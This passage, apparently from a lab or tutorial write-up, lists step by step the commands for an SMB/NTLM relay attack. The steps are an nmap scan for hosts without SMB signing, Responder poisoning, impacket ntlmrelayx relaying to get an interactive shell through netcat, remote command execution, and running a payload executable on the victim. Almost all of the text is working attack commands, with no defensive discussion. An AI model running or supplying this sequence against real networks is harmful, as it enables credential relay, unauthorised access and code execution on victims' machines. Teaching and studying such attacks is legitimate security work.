## Attacker Commands

The following are the commands the attacker used while carrying out this attack:

#### Scanning the network using nmap

The attacker has many options to scan the network e.g. Nessus to see if there are any devices where SMB signing is not enabled. For this example, the attacker used the following nmap command, utilizing an nmap built in script:

```
nmap -p 445 --script smb2-security-mode.nse 192.168.4.0/24
```

#### Create a file with the list of IP addresses found with SMB signing not required

```
nano targets.txt
```

#### Make configuration changes to the Responder

The attacker then needs to turn off the HTTP and Server servers in the Responder by making configuration changes on the Responder.conf file using nano.

```
sudo nano /etc/responder/Responder.conf
```

#### Run Responder

```
sudo responder -I eth0 -wFd
```

#### Setting up the relay

```
ntlmrelayx.py -tf targets.txt -smb2support
```

#### Install ntlmrelay

```
python3 -m pipx install impacket
```

#### Gain an interactive shell using ntlmrelayx

```
ntlmrelayx.py –tf targets.txt –smb2support -i
```

#### Spawn the reverse shell on the victim machine 

```
nc 127.0.0.1 11000
```

#### Netcat commands list

- help - See list of commands
- shares - See the list of shares
- use C$ - Access the C file share. C$ requires admin priviledges
- use ADMIN$ - Access the admin file share i.e. the System32 folder in Windows

#### Executing commands using ntlmrelayx e.g. shell command whoami

```
ntlmrelayx –tf targets.txt –smb2support –c “whoami”
```

#### Setting up a Meterpreter listener to create a payload that will allow the attacker to get a shell in Metasploit

```
ntlmrelayx –tf targets.txt –smb2support –e test.exe
```
